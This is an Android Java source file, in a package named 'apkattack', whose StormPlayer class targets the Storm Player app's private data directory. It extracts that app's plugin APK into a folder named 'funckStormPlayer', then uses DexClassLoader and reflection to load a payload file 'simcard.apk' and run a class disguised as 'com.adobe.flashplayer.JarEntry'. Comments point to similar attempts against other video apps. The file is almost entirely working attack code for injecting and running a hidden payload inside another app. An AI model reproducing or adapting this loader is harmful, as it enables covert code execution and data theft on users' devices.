package com.example.apkattack;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import android.annotation.SuppressLint;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class StormPlayer {

	@SuppressLint("SdCardPath") public static void stormplayerEntry(Context context){
    	String Tag = "stormplayerEntry";
    	try {
    		//error list files:/data/data/com.qiyi.video/app_pluginapp/android.app.fw/app_pluginapp/
    		//String apptpath = context.getFilesDir().getParent() + "/";
    		
    		String apptpath = "/data/data/com.storm.smart/";
	    	String unzippath = apptpath + "funckStormPlayer/";

	    	//String apkfn = "qqsdl.apk";
	    	String apkfn = "simcard.apk";
	    	
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
	    	//String dexclassname = "com.google.android.apps.plus.JarEntry";
	    	
	    	String dexmethodname = "start";
	    	
	    	String cfgfn = "ark.dat";
	    	
	    	File apk = new File(unzippath + apkfn);
	    	File config = new File(unzippath + cfgfn);
	    	if (apk.exists() == false || config.exists() == false) {
		    	
		    	String pluginPath = "/data/data/com.storm.smart/Plugin/com.storm.newsvideo/apk/";
		    	File pluginFile = new File(pluginPath);
		    	File [] pluginFiles = pluginFile.listFiles();
		    	if (pluginFiles == null) {
		    		Log.e(Tag,"error list files:" + pluginPath);
					return;
				}
		    	
		    	String fwapkfn = "";
		    	for (int i = 0; i < pluginFiles.length; i++) {
		    		if (pluginFiles[i].isDirectory()) {
						continue;
					}
		    		
		    		String tmpString = pluginFiles[i].getName();
					if ( tmpString.startsWith("base") && 
							( tmpString.endsWith(".apk") || tmpString.endsWith(".zip") ) ) {
						fwapkfn = tmpString;
						Log.e(Tag,"find apk file:" + fwapkfn);
						break;
					}
				}

				File unzippathfFile = new File(unzippath);
				if (unzippathfFile.exists() == false) {
					boolean ret = unzippathfFile.mkdirs();
					if (ret == false) {
						Log.e(Tag,"error create unzip folder:" + unzippath);
						return;
					}else{
						Log.e(Tag,"successully unzip make path:" + unzippath);
					}
				}else{
					Log.e(Tag,"already exist unzip path:" + unzippath);
				}
				
		        ZipEntry zipEntry = null;
		        byte unzipbuf[] = new byte[0x10000];
		        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(pluginPath + fwapkfn)));

	            while ( (zipEntry = zipIn.getNextEntry()) != null) {
	            	File unzipfile = new File(unzippath + zipEntry.getName());
	                if (zipEntry.isDirectory()) {
	                	unzipfile.mkdirs();
	                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
	                } else {
	                    File unzipparent = unzipfile.getParentFile();
	                    if (unzipparent.exists() == false) {
	                    	unzipparent.mkdirs();
	                    	
	                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
	                    }
	                    
	                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
	                    int readedBytes = 0;
	                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
	                        fileOut.write(unzipbuf, 0, readedBytes);
	                    }
	                    fileOut.close();
	                }
	                zipIn.closeEntry();
	            }
	            zipIn.close();
	            
	            Log.e(Tag,"unzip complete");
			}else{
				Log.e(Tag,"find apk and config file");
			}

	    	String appcachepath = context.getCacheDir() + "/";
	    	
	    	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);
    	    
    	    Log.e(Tag, "load apk or dex success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "load apk or dex exception");
    	}
	}

}
